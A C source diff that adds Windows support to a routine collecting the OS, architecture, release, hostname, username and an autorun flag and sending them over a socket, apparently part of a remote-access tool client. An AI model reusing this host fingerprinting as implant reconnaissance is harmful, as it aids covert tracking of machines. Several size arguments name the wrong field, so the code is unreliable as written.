@@ -10,9 +10,14 @@
 #include "../include/information.h"
 
 #include <unistd.h>
+#ifdef __unix__
 #include <sys/utsname.h>
-#include <string.h>
 #include <pwd.h>
+#else
+#include "../include/utsname_windows.h"
+#include <windows.h>
+#endif
+#include <string.h>
 #include <stdio.h>
 
 #include "../include/sockets.h"
@@ -31,16 +36,30 @@
  */
 host_t
 get_host_info(void) {
-    struct passwd   *user;
-    struct utsname  host_info;
-    host_t          host;
+    #ifdef __unix__
+    struct passwd       *user;
+    struct utsname      host_info;
+    #else
+    #endif
+    host_t              host;
 
+    #ifdef __unix__
     user = getpwuid(getuid());
+    snprintf(host.username, sizeof host.op_system, "%s", user->pw_name);
+    #else
+    struct w_utsname    host_info;
+    char                username[20];
+    uint32_t            username_size;
+
+    username_size = sizeof username;
+    if (GetUserNameA(username, (unsigned long *)&username_size)) {
+        snprintf(host.username, sizeof host.op_system, "%s", username);
+    }
+    #endif
     uname(&host_info);
     snprintf(host.op_system, sizeof host.op_system, "%s", host_info.sysname);
     snprintf(host.architecture, sizeof host.op_system, "%s", host_info.machine);
     snprintf(host.release, sizeof host.op_system, "%s", host_info.release);
-    snprintf(host.username, sizeof host.op_system, "%s", user->pw_name);
     gethostname(host.hostname, sizeof host.hostname);
     host.autorun_enabled = 0;
     return host;
@@ -75,6 +94,7 @@ send_host_info(int16_t socket_fd, host_t host) {
     hostname_len = strlen(host.hostname) + 1;
     username_len = strlen(host.username) + 1;
 
+    #ifdef __unix__
     send(socket_fd, &op_system_len, sizeof op_system_len, 0);
     send(socket_fd, host.op_system, op_system_len, 0);
 
@@ -91,4 +111,23 @@ send_host_info(int16_t socket_fd, host_t host) {
     send(socket_fd, host.username, username_len, 0);
 
     send(socket_fd, &host.autorun_enabled, sizeof host.autorun_enabled, 0);
+    #else
+    send(socket_fd, (char *)&op_system_len, sizeof op_system_len, 0);
+    send(socket_fd, host.op_system, op_system_len, 0);
+
+    send(socket_fd, (char *)&arch_len, sizeof arch_len, 0);
+    send(socket_fd, host.architecture, arch_len, 0);
+
+    send(socket_fd, (char *)&kernel_len, sizeof kernel_len, 0);
+    send(socket_fd, host.release, kernel_len, 0);
+
+    send(socket_fd, (char *)&hostname_len, sizeof hostname_len, 0);
+    send(socket_fd, host.hostname, hostname_len, 0);
+
+    send(socket_fd, (char *)&username_len, sizeof username_len, 0);
+    send(socket_fd, host.username, username_len, 0);
+
+    send(socket_fd, (char *)&host.autorun_enabled, sizeof host.autorun_enabled,
+                                                   0);
+    #endif
 }
